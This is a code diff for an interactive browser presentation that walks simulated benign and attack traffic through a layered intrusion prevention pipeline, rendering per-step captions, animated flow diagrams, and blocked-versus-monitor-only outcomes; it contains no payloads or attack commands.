+    title: 'Traffic Ingress: Query Sent',
+    body: `<b>${c.name}</b> sent from source IP <code>${c.src_ip}</code> to <code>POST /api/ips/query</code> on destination port <b>${c.port}</b>.`,
+    chips: [['Source IP', c.src_ip], ['Traffic', c.short], ['Target Port', c.port]]
+  });
+
+  // Safe flow
+  if (!atk) {
+    st.push({
+      n: 'l0',
+      title: 'Layer 0: IP Quarantine Cache Checked',
+      body: `IP <code>${c.src_ip}</code> is looked up in the stateful in-memory cache. Not quarantined. Flow proceeds to deep inspection.`,
+      chips: [['Layer 0', 'PASS', 'green'], ['Reputation', 'Clean', 'green']]
+    });
+    st.push({
+      n: 'l1',
+      title: 'Layer 1: Suricata Signature Scan',
+      body: 'Suricata scans payload against SIDs 2010935 to 2034647. No SQLi, RCE, or exploit patterns match.',
+      chips: [['Layer 1', 'CLEAN', 'green'], ['SIDs Scanned', 'All SIDs']]
+    });
+    st.push({
+      n: 'l2',
+      title: `Layer 2: Random Forest ML (p=${c.p.toFixed(2)})`,
+      body: '19 statistical flow features computed (packet rate, inter-arrival time, flag ratios). Anomaly probability is far below threshold &tau;*=0.64.',
+      chips: [['Layer 2', 'CLEAN', 'green'], ['ML Prob', c.p.toFixed(2), 'green'], ['Features', c.feats]]
+    });
+    st.push({
+      n: 'l3',
+      title: `Layer 3: Shannon Entropy DPI (H=${c.entropy} bits/B)`,
+      body: `Entropy is ${c.entropy} bits/Byte (&lt; 4.85 threshold). Target URL does not access zero-trust decoys.`,
+      chips: [['Layer 3', 'CLEAN', 'green'], ['Entropy H(X)', `${c.entropy} bits/B`, 'green']]
+    });
+    st.push({
+      n: 'benign',
+      title: 'Classification: Verified Benign Flow',
+      body: 'Passed all 4 defense tiers without triggering any security engine. Threat Risk Score = 0.',
+      chips: [['Verdict', 'SAFE', 'green'], ['Risk Score', '0', 'green']]
+    });
+    st.push({
+      n: 'safe',
+      title: 'HTTP 200: Allowed to Destination Server',
+      body: 'Normal business query reaches the production server unimpeded, regardless of the IPS switch position.',
+      chips: [['Response', '200 ALLOWED', 'green'], ['Block Mode', B ? 'ON' : 'OFF']],
+      out: 'allow'
+    });
+    return st;
+  }
+
+  // Attack: Scenario 8 (Repeat Quarantined IP)
+  if (key() === 'quarantine') {
+    if (B) {
+      st.push({
+        n: 'l0',
+        title: 'Layer 0: Stateful Auto-Quarantine Hit!',
+        body: `Source IP <code>${c.src_ip}</code> was previously banned for SQL Injection! The Layer 0 pre-filter catches it in memory in <b>0.01 ms</b>, dropping it instantly without wasting Suricata or ML CPU cycles!`,
+        chips: [['Layer 0', 'QUARANTINE HIT', 'fuchsia'], ['Latency', '0.01 ms', 'fuchsia'], ['Banned For', 'SQLi']]
+      });
+      st.push({
+        n: 'blocked',
+        title: 'HTTP 403: Quarantined Pre-Filter Drop',
+        body: 'Connection terminated at Layer 0 in sub-millisecond memory cache. The attack packet never touches deeper engines or the server.',
+        chips: [['Response', '403 QUARANTINED', 'fuchsia'], ['CPU Cycles Saved', '100%', 'green']],
+        out: 'blocked'
+      });
+      return st;
+    } else {
+      st.push({
+        n: 'l0',
+        title: 'Layer 0: Quarantine Passive (Block OFF)',
+        body: `Source IP <code>${c.src_ip}</code> is recognized as a repeat offender, but Block Mode is OFF. Traffic falls through to the inspection engines.`,
+        chips: [['Layer 0', 'PASSIVE', 'amber'], ['Block Mode', 'OFF', 'amber']]
+      });
+      st.push({
+        n: 'l1',
+        title: 'Layer 1: Payload Inspected',
+        body: 'Suricata evaluates the repeat probe. Flagged as malicious repeat activity.',
+        chips: [['Repeat IP', c.src_ip, 'red']]
+      });
+    }
+  }
+
+  // Attack: Layer 1 (SQLi / Log4j)
+  else if (c.layer === 1) {
+    st.push({
+      n: 'l0',
+      title: 'Layer 0: IP Quarantine Cache Checked',
+      body: `First-time request from IP <code>${c.src_ip}</code>. Not yet in quarantine cache. Proceeds to Layer 1.`,
+      chips: [['Layer 0', 'PASS', 'green'], ['Reputation', 'Clean']]
+    });
+    st.push({
+      n: 'l1',
+      title: `Layer 1: Suricata Signature Match (SID ${c.sid})`,
+      body: `Deterministic rule match! Payload matches <b>${c.rule}</b>. Flagged instantly without requiring ML flow calculation.`,
+      chips: [['Layer 1', 'SIGNATURE HIT', 'red'], ['SID', c.sid, 'red'], ['Rule', 'ET OPEN']]
+    });
+  }
+
+  // Attack: Layer 2 (SYN Flood / Slowloris)
+  else if (c.layer === 2) {
+    st.push({
+      n: 'l0',
+      title: 'Layer 0: IP Quarantine Cache Checked',
+      body: `First-time request from IP <code>${c.src_ip}</code>. Proceeds to Layer 1 inspection.`,
+      chips: [['Layer 0', 'PASS', 'green']]
+    });
+    st.push({
+      n: 'l1',
+      title: 'Layer 1: No Signature Match (Volumetric)',
+      body: 'Suricata finds no exploit strings. Volumetric and low-rate attacks have zero payload signatures, so they slip past Layer 1.',
+      chips: [['Layer 1', 'BYPASSED', 'amber'], ['Payload', 'Zero-Sig']]
+    });
+    st.push({
+      n: 'l2',
+      title: `Layer 2: Random Forest ML Anomaly (p=${c.p.toFixed(3)})`,
+      body: `19 flow features computed. Asymmetric timing and abnormal flag counts yield probability &ge; &tau;*=0.64. Flagged by the Balanced Random Forest!`,
+      chips: [['Layer 2', 'ML ANOMALY', 'violet'], ['Prob', c.p.toFixed(3), 'violet'], ['Threshold', 'τ*=0.64']]
+    });
+  }
+
+  // Attack: Layer 3 (Shellcode / Honeypot)
+  else if (c.layer === 3) {
+    st.push({
+      n: 'l0',
+      title: 'Layer 0: IP Quarantine Cache Checked',
+      body: `First-time request from IP <code>${c.src_ip}</code>. Moves to Layer 1.`,
+      chips: [['Layer 0', 'PASS', 'green']]
+    });
+    st.push({
+      n: 'l1',
+      title: 'Layer 1: No Signature Match (Bypassed)',
+      body: 'Suricata rules miss the obfuscated payload / normal HTTP probe. Slips past Layer 1.',
+      chips: [['Layer 1', 'BYPASSED', 'amber']]
+    });
+    st.push({
+      n: 'l2',
+      title: 'Layer 2: Flow ML Normal (Bypassed)',
+      body: 'Single-stream, low packet rate appears normal to volumetric statistical models. Slips past Layer 2.',
+      chips: [['Layer 2', 'BYPASSED', 'amber']]
+    });
+    st.push({
+      n: 'l3',
+      title: `Layer 3: DPI Entropy / Decoy Triggered!`,
+      body: `<b>${c.rule}</b>. Obfuscated byte packing or zero-trust decoy path detected by deep inspection!`,
+      chips: [['Layer 3', 'DETECTED', 'cyan'], ['Detection', c.short, 'cyan']]
+    });
+  }
+
+  // Risk Scoring (40% Sev, 30% Conf, 20% Beh, 10% Ctx)
+  st.push({
+    n: 'risk',
+    title: `4-Factor Risk Score: ${c.score} (CRITICAL THREAT)`,
+    body: 'Severity (40%), Detection Confidence (30%), Behavioral Anomaly (20%), and Asset Context (10%) computed into linear triage score.',
+    chips: [['Sev x0.4', c.sev], ['Conf x0.3', c.conf], ['Beh x0.2', c.beh], ['Ctx x0.1', c.ctx], ['Risk Score', c.score, 'red']]
+  });
+
+  // Gatekeeper
+  st.push({
+    n: 'gate',
+    title: `Active IPS Gatekeeper: Block Mode is ${B ? 'ON' : 'OFF'}`,
+    body: B
+      ? 'Block Mode is ON. Threat score exceeds mitigation threshold. The firewall actively terminates the connection!'
+      : 'Block Mode is OFF (Monitor Only). Alert is recorded on the SOC dashboard, but the attack is permitted through.',
+    chips: [['Threat Score', c.score, 'red'], ['Block Mode', B ? 'ON' : 'OFF', B ? 'green' : 'amber']]
+  });
+
+  // Final Action
+  if (B) {
+    st.push({
+      n: 'blocked',
+      title: 'HTTP 403: Blocked & IP Auto-Quarantined',
+      body: `Attack terminated at the firewall gate. Attacker IP <code>${c.src_ip}</code> is auto-enrolled into Layer 0 Quarantine for instant future blocking!`,
+      chips: [['Response', '403 BLOCKED', 'red'], ['IP Status', 'Auto-Quarantined', 'fuchsia'], ['Server Safe', 'Yes', 'green']],
+      out: 'blocked'
+    });
+  } else {
+    st.push({
+      n: 'monitor',
+      title: 'HTTP 200: Allowed (Block Mode OFF)',
+      body: 'Attack detected and logged, but firewall did not drop it. The malicious payload reaches the destination server.',
+      chips: [['Response', '200 ALLOWED', 'amber'], ['Firewall State', 'Monitor Only', 'amber'], ['Server Reached', 'Yes (Vulnerable)', 'red']],
+      out: 'monitor'
+    });
+  }
+
+  return st;
+}
+
+/* ---------- STAGE & BEZIER CONNECTIONS ---------- */
+function edgePath(a, b) {
+  const A = NODES[a], Bn = NODES[b];
+  if (!A || !Bn) return { d: '', mx: 0, my: 0 };
+
+  // Special swooping loop for Layer 0 Quarantine direct drop to 403 Blocked
+  if (a === 'l0' && b === 'blocked') {
+    const x1 = A.x, y1 = A.y - H / 2;
+    const x2 = Bn.x - W / 2 - 6, y2 = Bn.y;
+    return { d: `M${x1},${y1} C${x1},25 880,25 ${x2},${y2}`, mx: (x1 + x2) / 2, my: 32 };
+  }
+
+  if (A.x === Bn.x) {
+    const y1 = A.y > Bn.y ? A.y - H / 2 : A.y + H / 2;
+    const y2 = A.y > Bn.y ? Bn.y + H / 2 + 6 : Bn.y - H / 2 - 6;
+    return { d: `M${A.x},${y1} L${Bn.x},${y2}`, mx: A.x, my: (y1 + y2) / 2 };
+  }
+
+  const x1 = A.x + W / 2, x2 = Bn.x - W / 2 - 6, xm = (x1 + x2) / 2;
+  if (A.y === Bn.y) return { d: `M${x1},${A.y} L${x2},${Bn.y}`, mx: xm, my: A.y };
+  return { d: `M${x1},${A.y} C${xm},${A.y} ${xm},${Bn.y} ${x2},${Bn.y}`, mx: xm, my: (A.y + Bn.y) / 2 };
+}
+
+function initStage() {
+  const mk = (id, col) => `<marker id="${id}" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="5" markerHeight="5" orient="auto-start-reverse"><path d="M1 1L9 5L1 9z" fill="${col}"/></marker>`;
+  let svg = `<defs>${mk('mg', '#c3cde0')}${mk('ms', '#16a34a')}${mk('ma', '#dc2626')}</defs>`, lab = '';
+
+  EDGES.forEach(([a, b, l]) => {
+    const p = edgePath(a, b);
+    svg += `<path class="edge" id="e_${a}_${b}" d="${p.d}"/>`;
+    if (l) lab += `<div class="elabel" style="left:${p.mx}px;top:${p.my}px">${l}</div>`;
+  });
+
+  $('edges').innerHTML = svg;
+  $('labels').innerHTML = lab;
+  $('nodes').innerHTML = Object.entries(NODES).map(([k, n]) =>
+    `<div class="node c-${n.c || 'none'} ${n.out ? 'out ' + n.out : ''}" id="n_${k}" style="left:${n.x}px;top:${n.y}px">
+      <div class="ni">${ic(n.i)}</div>
+      <div><b>${n.t}</b><small>${n.s}</small></div>
+    </div>`
+  ).join('');
+}
+
+function fit() {
+  const w = $('stagewrap'), cv = $('canvas');
+  if (!w || !cv) return;
+  const pad = 12, sc = Math.min((w.clientWidth - pad * 2) / 1200, (w.clientHeight - pad * 2) / 570);
+  cv.style.transform = `scale(${sc})`;
+  cv.style.left = ((w.clientWidth - 1200 * sc) / 2) + 'px';
+  cv.style.top = ((w.clientHeight - 570 * sc) / 2) + 'px';
+}
+
+function renderSim() {
+  const c = SC[key()], steps = buildSteps();
+  S.step = Math.min(S.step, steps.length - 1);
+  const st = steps[S.step], path = steps.map(s => s.n), kind = c.kind;
+
+  $('scPill').className = 'pill ' + kind;
+  $('scPill').innerHTML = ic(kind === 'safe' ? 'check' : 'zap') + c.name;
+
+  $('togSim').classList.toggle('on', S.block);
+  $('togSim').querySelector('.lbl').textContent = 'BLOCK MODE: ' + (S.block ? 'ON' : 'OFF');
+
+  const reached = path.slice(0, S.step + 1);
+  Object.keys(NODES).forEach(k => {
+    const el = $('n_' + k);
+    if (!el) return;
+    el.classList.toggle('cur', k === st.n);
+    el.classList.toggle('visited', reached.includes(k) && k !== st.n);
+  });
+
+  EDGES.forEach(([a, b]) => {
+    const el = $(`e_${a}_${b}`);
+    if (!el) return;
+    let on = false;
+    for (let i = 0; i < S.step; i++) {
+      if (path[i] === a && path[i + 1] === b) on = true;
+    }
+    el.classList.toggle('on', on);
+    el.classList.toggle('safe', kind === 'safe');
+    el.classList.toggle('atk', kind === 'atk');
+  });
+
+  const N = NODES[st.n], pk = $('packet');
+  pk.className = 'packet ' + kind;
+  pk.innerHTML = ic(kind === 'safe' ? 'box' : 'zap') + c.short;
+  const pw = pk.offsetWidth || 140;
+  pk.style.transform = `translate(${N.x - pw / 2}px,${N.y - H / 2 - 28}px)`;
+
+  if (st.out === 'blocked') setTimeout(() => pk.classList.add('stopped'), 950);
+
+  $('stepno').textContent = `Step ${S.step + 1} of ${steps.length} · Defense Pipeline`;
+  $('captitle').textContent = st.title;
+  $('capbody').innerHTML = st.body;
+  $('chips').innerHTML = st.chips.slice(0, 4).map(([k, v, t]) =>
+    `<div class="chip ${t || ''}"><span>${k}</span><code>${v}</code></div>`
+  ).join('');
+  $('prog').style.width = ((S.step + 1) / steps.length * 100) + '%';
+}
+
+/* ---------- RESULT SLIDE ---------- */
+function outcome(c, block) {
+  if (c.kind === 'safe') return { cls: 'allow', code: 200, label: 'ALLOWED', icon: 'check' };
+  if (key() === 'quarantine' && block) return { cls: 'blocked', code: 403, label: 'QUARANTINED', icon: 'ban' };
+  return block
+    ? { cls: 'blocked', code: 403, label: 'BLOCKED', icon: 'ban' }
+    : { cls: 'monitor', code: 200, label: 'ALLOWED (Block OFF)', icon: 'eye' };
+}
+
+function renderResult() {
+  const c = SC[key()], o = outcome(c, S.block);
+  $('resSub').textContent = `${c.name} · Target Port ${c.port} · Source ${c.src_ip}`;
+
+  const msg = {
+    blocked: 'Dropped by Active IPS. Attack terminated before reaching the destination server.',
+    monitor: 'Detected and logged in SOC audit trails, but NOT dropped. The malicious payload reached the server because Block Mode was OFF.',
+    allow: 'Normal verified traffic passed through untouched to the destination server.'
+  }[o.cls];
+
+  $('verdict').className = 'verdict ' + o.cls;
+  $('verdict').innerHTML = `<div class="vi">${ic(o.icon)}</div><div class="code">${o.code}</div><div class="st">${o.label}</div><p>${msg}</p>`;
+  $('mitreBadge').textContent = `MITRE ATT&CK: ${c.mitre}`;
+
+  $('cmpRows').innerHTML = [true, false].map(b => {
+    const x = outcome(c, b);
+    const col = x.cls === 'blocked' ? 'red' : x.cls === 'monitor' ? 'amber' : 'green';
+    return `<div class="row ${b === S.block ? 'now' : ''}">
+      <div>
+        <b>Block Mode ${b ? 'ON' : 'OFF'}</b>
+        <span class="d">${b ? 'Active IPS: Threat Dropped & IP Quarantined' : 'IDS Monitor Only: Logged, not blocked'}</span>
+      </div>
+      <span class="badge ${col}">${x.code} ${x.label}</span>
+    </div>`;
+  }).join('');
+}
+
+/* ---------- AUTO-PLAY PRESENTATION MODE ---------- */
+function toggleAutoPlay() {
+  if (autoPlayTimer) {
+    stopAutoPlay();
+  } else {
+    startAutoPlay();
+  }
+}
+
+function startAutoPlay() {
+  if (S.slide !== 2) {
+    S.slide = 2;
+    show();
+  }
+  const btn = $('autoPlayBtn');
+  btn.classList.add('primary');
+  $('autoPlayLbl').textContent = 'Pause';
+  btn.querySelector('svg').outerHTML = ic('pause');
+
+  autoPlayTimer = setInterval(() => {
+    const steps = buildSteps();
+    if (S.step < steps.length - 1) {
+      S.step++;
+      renderSim();
+      show();
+    } else {
+      stopAutoPlay();
+      setTimeout(() => {
+        S.slide = 3;
+        show();
+      }, 700);
+    }
+  }, 1250);
+}
+
+function stopAutoPlay() {
+  if (autoPlayTimer) {
+    clearInterval(autoPlayTimer);
+    autoPlayTimer = null;
+  }
+  const btn = $('autoPlayBtn');
+  if (btn) {
+    btn.classList.remove('primary');
+    $('autoPlayLbl').textContent = 'Auto-Play';
+    const svg = btn.querySelector('svg');
+    if (svg) svg.outerHTML = ic('play');
+  }
+}
+
+/* ---------- SLIDE NAVIGATION ---------- */
+const TOTAL = 4;
+const setNext = (txt, icon) => { $('next').innerHTML = txt + (icon ? ic(icon) : ''); };
+
+function show() {
+  document.querySelectorAll('.slide').forEach((s, i) => {
+    s.classList.toggle('active', i === S.slide);
+    s.classList.toggle('past', i < S.slide);
+  });
+
+  $('dots').innerHTML = Array.from({ length: TOTAL }, (_, i) =>
+    `<div class="dot ${i === S.slide ? 'on' : i < S.slide ? 'done' : ''}"></div>`
+  ).join('');
+
+  $('back').disabled = S.slide === 0;
+  $('next').disabled = false;
+
+  if (S.slide === 0) setNext('Start Walkthrough', 'right');
+  else if (S.slide === 1) { setNext('Run Simulation', 'right'); $('next').disabled = !S.sel; }
+  else if (S.slide === 2) {
+    const n = buildSteps().length;
+    setNext(S.step === n - 1 ? 'See Result' : 'Next Step', 'right');
+  } else {
+    setNext('Restart', 'refresh');
+  }
+
+  if (S.slide === 2) requestAnimationFrame(() => { fit(); renderSim(); });
+  if (S.slide === 3) renderResult();
+}
+
+function next() {
+  if (S.slide === 1 && !S.sel) return;
+  if (S.slide === 2) {
+    const n = buildSteps().length;
+    if (S.step < n - 1) {
+      S.step++;
+      renderSim();
+      show();
+      return;
+    }
+  }
+  if (S.slide === 3) {
+    stopAutoPlay();
+    S.slide = 0;
+    S.sel = null;
+    S.step = 0;
+    syncChoose();
+    show();
+    return;
+  }
+  stopAutoPlay();
+  S.slide++;
+  if (S.slide === 2) S.step = 0;
+  show();
+}
+
+function back() {
+  stopAutoPlay();
+  if (S.slide === 2 && S.step > 0) {
+    S.step--;
+    renderSim();
+    show();
+    return;
+  }
+  if (S.slide === 3) {
+    S.slide = 2;
+    S.step = buildSteps().length - 1;
+    show();
+    return;
+  }
+  if (S.slide > 0) {
+    S.slide--;
+    show();
+  }
+}
+
+function setBlock(v) {
+  S.block = v;
+  [$('togChoose'), $('togSim')].forEach(t => {
+    t.classList.toggle('on', v);
+    t.querySelector('.lbl').textContent = 'BLOCK MODE: ' + (v ? 'ON' : 'OFF');
+  });
+  if (S.slide === 2) { renderSim(); show(); }
+  if (S.slide === 3) renderResult();
+}
+
+function syncChoose() {
+  $('pickSafe').classList.toggle('sel', S.sel === 'safe');
+  $('pickAtk').classList.toggle('sel', S.sel === 'atk');
+  $('atkrow').classList.toggle('hide', S.sel !== 'atk');
+  document.querySelectorAll('.chip-btn').forEach(b =>
+    b.classList.toggle('sel', S.sel === 'atk' && b.dataset.a === S.atk)
+  );
+  $('togChoose').classList.toggle('on', S.block);
+  $('togChoose').querySelector('.lbl').textContent = 'BLOCK MODE: ' + (S.block ? 'ON' : 'OFF');
+}
+
+function selectScenario(scKey) {
+  if (scKey === 'safe') {
+    S.sel = 'safe';
+  } else {
+    S.sel = 'atk';
+    S.atk = scKey;
+  }
+  syncChoose();
+  S.step = 0;
+  if (S.slide > 1) {
+    S.slide = 2;
+    renderSim();
+  }
+  show();
+}
+
+/* ---------- STATIC INITIALIZATION ---------- */
+$('miniflow').innerHTML = [
+  ['terminal', 'Traffic Ingress'],
+  ['lock', 'L0 Quarantine'],
+  ['search', 'L1 Signatures'],
+  ['tree', 'L2 Flow ML'],
+  ['box', 'L3 Entropy &amp; Decoys'],
+  ['bars', 'Risk Scorer'],
+  ['shield', 'IPS Gate']
+].map(([i, t], k, a) =>
+  `<div class="m">${ic(i)}${t}</div>${k < a.length - 1 ? `<div class="ar">${ic('right')}</div>` : ''}`
+).join('');
+
+$('back').innerHTML = ic('left') + 'Back';
+$('fs').innerHTML = ic('expand');
+$('flipBtn').innerHTML = ic('swap') + 'Flip block mode and replay';
+$('againBtn').innerHTML = ic('refresh') + 'Try another traffic scenario';
+hydrateIcons();
+
+$('pickSafe').onclick = () => { S.sel = 'safe'; syncChoose(); show(); };
+$('pickAtk').onclick = () => { S.sel = 'atk'; syncChoose(); show(); };
+document.querySelectorAll('.chip-btn').forEach(b => b.onclick = () => { S.sel = 'atk'; S.atk = b.dataset.a; syncChoose(); show(); });
+
+$('togChoose').onclick = () => setBlock(!S.block);
+$('togSim').onclick = () => setBlock(!S.block);
+$('autoPlayBtn').onclick = toggleAutoPlay;
+
+$('next').onclick = next;
+$('back').onclick = back;
+$('fs').onclick = () => {
+  document.fullscreenElement
+    ? document.exitFullscreen()
+    : document.documentElement.requestFullscreen && document.documentElement.requestFullscreen();
+};
+
+$('flipBtn').onclick = () => {
+  stopAutoPlay();
+  S.block = !S.block;
+  syncChoose();
+  S.slide = 2;
+  S.step = 0;
+  show();
+};
+$('againBtn').onclick = () => {
+  stopAutoPlay();
+  S.slide = 1;
+  S.step = 0;
+  show();
+};
+
+/* ---------- KEYBOARD SHORTCUTS FOR PRESENTATION ---------- */
+document.addEventListener('keydown', e => {
+  if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') return;
+
+  if (e.key === 'ArrowRight' || e.key === ' ' || e.key === 'Enter') {
+    e.preventDefault();
+    next();
+  } else if (e.key === 'ArrowLeft') {
+    e.preventDefault();
+    back();
+  } else if (e.key === 'p' || e.key === 'P') {
+    e.preventDefault();
+    toggleAutoPlay();
+  } else if (e.key === 'b' || e.key === 'B') {
+    e.preventDefault();
+    setBlock(!S.block);
+  } else if (e.key === 'f' || e.key === 'F') {
+    e.preventDefault();
+    document.fullscreenElement
+      ? document.exitFullscreen()
+      : document.documentElement.requestFullscreen && document.documentElement.requestFullscreen();
+  } else if (e.key === '1') {
+    selectScenario('safe');
+  } else if (e.key === '2') {
+    selectScenario('sqli');
+  } else if (e.key === '3') {
+    selectScenario('log4j');
+  } else if (e.key === '4') {
+    selectScenario('syn');
+  } else if (e.key === '5') {
+    selectScenario('slow');
+  } else if (e.key === '6') {
+    selectScenario('shellcode');
+  } else if (e.key === '7') {
+    selectScenario('honeypot');
+  } else if (e.key === '8') {
+    selectScenario('quarantine');
+  }
+});
+
+window.addEventListener('resize', fit);
+initStage();
+syncChoose();
+show();
+</script>
+</body>
+</html>
